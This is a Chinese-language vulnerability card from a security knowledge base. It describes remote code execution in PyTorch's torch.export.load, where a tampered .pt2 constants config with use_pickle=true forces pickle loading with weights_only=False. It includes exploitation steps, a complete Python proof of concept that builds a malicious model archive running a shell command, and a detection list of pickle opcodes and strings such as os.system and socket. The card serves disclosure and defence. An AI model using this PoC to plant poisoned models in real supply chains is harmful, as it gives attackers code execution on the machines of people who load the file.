---
id: ai-security-supply-chain-pytorch-pt2-constants-use-pickle-rce
title: PyTorch torch.export.load 加载 .pt2 常量配置 use_pickle=true：_load_constants 硬编码 weights_only=False 反序列化 RCE
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: pytorch-pt2-constants-use-pickle-deserialization-rce
tags:
- ai-supply-chain
- pytorch
- pt2
- torch-export
- constants
- pickle
- deserialization
- rce
- model-loading
- weights-only
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: PyTorch 2.11.0.dev20260110（原文实测版本；原文称最新版本仍存在该漏洞）
verification:
  verified_by: verifier-V167
  verified_at: '2026-11-06T13:29:25+08:00'
  notes: 已对照原文全文与4张图核对：.pt2 ZIP、PT2ArchiveReader/Writer 重打包、model_constants_config.json 插入 path_name=tensor_666 + use_pickle=true、_load_constants 在 tensor 前缀且 use_pickle 分支调用 torch.load(...,weights_only=False)、torch.export.load 无 weights_only 参数、2.11.0.dev20260110 实测（图01）、macOS 触发写入 /tmp/pt2_pwned（图03/04）均一致；与既有 pytorch-export-load-use-pickle-rce 卡的 model_weights_config.json+_load_state_dict 分支差异真实存在（不同配置键/函数/trigger）。未验证点：PoC 未本机复跑；card 中 data/constants/ 字面路径为按 constants.CONSTANTS_DIR 推得，原文未直接打印该常量值；原文无 CVE/版本区间，仅实测版本。已修正一处对返回 ExportedProgram“可用”的过度表述。
url: /docs/ai-security/supply-chain/ai-security-supply-chain-pytorch-pt2-constants-use-pickle-rce/
draft: false
kb_aliases:
- torch.export.load 常量 RCE
- .pt2 常量反序列化
- model_constants_config.json use_pickle
- tensor 常量 pickle 载荷
- PyTorch PT2 模型加载 RCE
- weights_only=False 硬编码
---

## 一句话结论

`.pt2` 归档中的常量配置文件（`*_constants_config.json`）由文件自身声明每个常量的加载方式；只要某条记录的 `path_name` 以 `tensor` 开头且 `use_pickle` 为 `true`，`torch.export.load()` 内部的 `_load_constants()` 就会读取对应文件并执行 `torch.load(io.BytesIO(bytes), weights_only=False)`，加载恶意 `.pt2` 即触发 pickle 反序列化任意代码执行，且公开 API 没有 `weights_only` 参数可供调用方关闭。

## 原理

- `torch.export.save()` 生成的 `.pt2` 本质是 ZIP 归档，除模型结构、state_dict 外还保存“常量”（constants）及其配置。加载入口 `torch.export.load(f)` 调用 `load_pt2(f)`，后者枚举归档条目后进入 `_load_exported_programs()`，再对每个模型调用 `_load_constants(archive_reader, model_name)`。
- `_load_constants()` 读取 `constants_config_file = CONSTANTS_CONFIG_FILENAME_FORMAT.format(model_name)`（即 `model_constants_config.json`），解析 `constants_config.config` 中每个 `constant_fqn` 对应的 `payload_meta`，再依据 `payload_meta.path_name` 的前缀决定加载方式。
- 漏洞分支的条件是：`path_name.startswith(TENSOR_CONSTANT_FILENAME_PREFIX)`（前缀为 `tensor`）且 `payload_meta.use_pickle` 为真。满足后代码读取 `data/constants/<path_name>` 的字节，并调用 `torch.load(io.BytesIO(constant_bytes), weights_only=False)`。`weights_only=False` 是硬编码常量，`torch.export.load()` 的签名中也没有该参数，调用方无法覆盖。
- `weights_only=False` 使 `torch.load` 走完整 pickle 反序列化：pickle 在还原对象时执行对象 `__reduce__()` 返回的 callable 与参数，因此构造一个 `__reduce__` 返回 `(os.system, (cmd,))` 的对象并用 `torch.save` 序列化，即可在“加载常量”阶段执行任意命令。
- 关键设计缺陷是“安全开关由不可信文件自己提供”：`use_pickle` 只是归档 JSON 中的普通布尔字段，而 `path_name` 也只是普通字符串；攻击者可以自由编辑两者。归档其余条目保持原模板内容，恶意常量只是额外插入的一条配置项；原文 PoC 截图显示 `torch.export.load()` 正常返回、进程退出码 0（未进一步验证返回对象的功能）。
- 另一条相关分支 `path_name.startswith(CUSTOM_OBJ_FILENAME_PREFIX)` 会调用 `torch._C._pickle_load_obj(constant_bytes)`，同样属于反序列化攻击面；本篇原文的 PoC 走 `tensor` + `use_pickle` 分支。
- 原测试环境为 PyTorch `2.11.0.dev20260110`，作者称该“最新版本仍存在此漏洞”，说明该路径尚未被默认安全策略覆盖。

## 触发条件

- 受害者使用 `torch.export.load()` 加载来源不可信的 `.pt2` 文件（模型仓库下载、邮件附件、CI 制品、共享目录、推理服务挂载模型等）。
- 目标 PyTorch 版本包含上述 `_load_constants()` 实现（原文实测 2.11.0.dev20260110）。
- 归档内 `model_constants_config.json` 中存在 `path_name` 以 `tensor` 开头且 `use_pickle: true` 的记录，且 `data/constants/` 下对应文件为恶意 pickle 字节。
- 加载进程未被沙箱隔离，且运行用户具备命令执行权限（通常即开发者或推理节点权限）。

## 利用步骤

1. 用官方 API 生成一个干净模板：定义简单 `torch.nn.Module`，调用 `torch.export.export()` 导出并 `torch.export.save()` 保存为 `victim.pt2`。
2. 用 `PT2ArchiveReader` 打开模板，枚举条目，找到文件名以 `_constants_config.json` 结尾的配置并解析 JSON。
3. 用 `pickle`（或 `torch.save` 配合 `DEFAULT_PICKLE_PROTOCOL`）序列化恶意对象：其 `__reduce__()` 返回 `(exec, (payload_code,))` 或 `(os.system, (cmd,))`。
4. 用 `PT2ArchiveWriter` 重新打包：复制除配置外的全部条目；把恶意字节写入 `data/constants/tensor_666`（文件名必须以 `tensor` 开头）；在配置的 `config` 中插入一条记录：`{path_name: "tensor_666", is_param: false, use_pickle: true, tensor_meta: null}`；写回配置文件。
5. 受害者执行 `torch.export.load("victim_malicious.pt2")`：`load_pt2 → _load_exported_programs → _load_constants` 命中漏洞分支，`torch.load(..., weights_only=False)` 触发 `__reduce__`，命令执行。
6. 验证：载荷写入标记文件（如 `/tmp/pt2_pwned`）或拉起计算器；即使后续反序列化模型结构时报错，命令已在 `torch.load` 阶段执行。

## PoC

```python
import io, json, os
import torch
import torch.nn as nn
from torch.export.pt2_archive import _package, constants

class Victim(nn.Module):
    def forward(self, x):
        return x + 1

# 1) 生成干净模板
ep = torch.export.export(Victim(), (torch.randn(1, 3, 224, 224),))
torch.export.save(ep, "victim.pt2")

# 2) 恶意 pickle：__reduce__ 返回可执行 callable
class UniversalPayload:
    def __reduce__(self):
        code = "import os; os.system('id > /tmp/pt2_pwned')"
        return (exec, (code,))

# 3) 重新打包并注入恶意常量
reader = _package.PT2ArchiveReader("victim.pt2")
files = reader.get_file_names()
cfg_name = [f for f in files if f.endswith("_constants_config.json")][0]
config = json.loads(reader.read_string(cfg_name))

with _package.PT2ArchiveWriter("victim_malicious.pt2") as writer:
    for name in files:
        if name != cfg_name:
            writer.write_bytes(name, reader.read_bytes(name))

    buf = io.BytesIO()
    torch.save(UniversalPayload(), buf,
               pickle_protocol=_package.DEFAULT_PICKLE_PROTOCOL)
    payload_path = constants.CONSTANTS_DIR + "tensor_666"
    writer.write_bytes(payload_path, buf.getvalue())

    config["config"]["exploit.constant"] = {
        "path_name": "tensor_666",      # 必须以 "tensor" 开头
        "is_param": False,
        "use_pickle": True,             # 触发 weights_only=False 分支
        "tensor_meta": None,
    }
    writer.write_string(cfg_name, json.dumps(config, indent=2))

# 4) 受害者侧触发
torch.export.load("victim_malicious.pt2")
```

## 变体与关联

- 变体：常量文件名不必是 `tensor_666`，只要以 `tensor` 开头即可；可插入多条记录，或把 `path_name` 指向归档内任意路径的载荷。
- 变体：把恶意 `.pt2` 伪装成正常导出/编译模型，通过模型市场、CI 制品、推理服务模型目录投递；归档保持结构合法，常规“能加载成功”检查无法发现。
- 关联：[[ai-security-supply-chain-pytorch-export-load-use-pickle-rce]]（同一 `torch.export.load` 体系，但走 `model_weights_config.json` + `_load_state_dict` 分支；本卡走 `model_constants_config.json` + `_load_constants` 且带 `tensor` 前缀条件）。
- 关联：[[ai-security-supply-chain-pytorch-dcp-load-bytes-weights-only-pickle-rce]]（分布式检查点 `load_bytes` 的同类 `weights_only=False` sink）、[[ai-security-supply-chain-llamafactory-value-head-torch-load-pickle-rce]]（应用层裸调 `torch.load`）。
- 边界：原文未给 CVE 编号；受影响范围仅有实测版本 2.11.0.dev20260110，其他版本需按 `_load_constants` 实现核对。

## 检测与防御

- 检测：加载前解包 `.pt2`，审计 `model_constants_config.json`：拒绝任何 `use_pickle: true` 的记录，尤其是 `path_name` 以 `tensor` 开头的；检查 `data/constants/` 下文件是否为合法张量格式而非 pickle 字节流（搜索 `GLOBAL`、`STACK_GLOBAL`、`os.system`、`subprocess`、`socket` 等 opcode/字符串）。
- 修复：在 `_load_constants` 中把 `torch.load(..., weights_only=False)` 改为 `weights_only=True`，或直接拒绝归档声明的 `use_pickle` 分支；为 `torch.export.load()` 提供可覆盖且默认安全的 `weights_only` 参数。
- 加固：把不可信 `.pt2` 视为可执行代码，在无网络、低权限、只读文件系统的容器/沙箱中加载；优先使用 `safetensors` 等纯权重格式；固定模型 revision 并校验 hash/签名。
- 防御：模型仓库与 CI 对上传的 `.pt2` 做结构审计与 pickle 扫描；监控加载进程拉起 shell/计算器等异常子进程及异常出站连接。
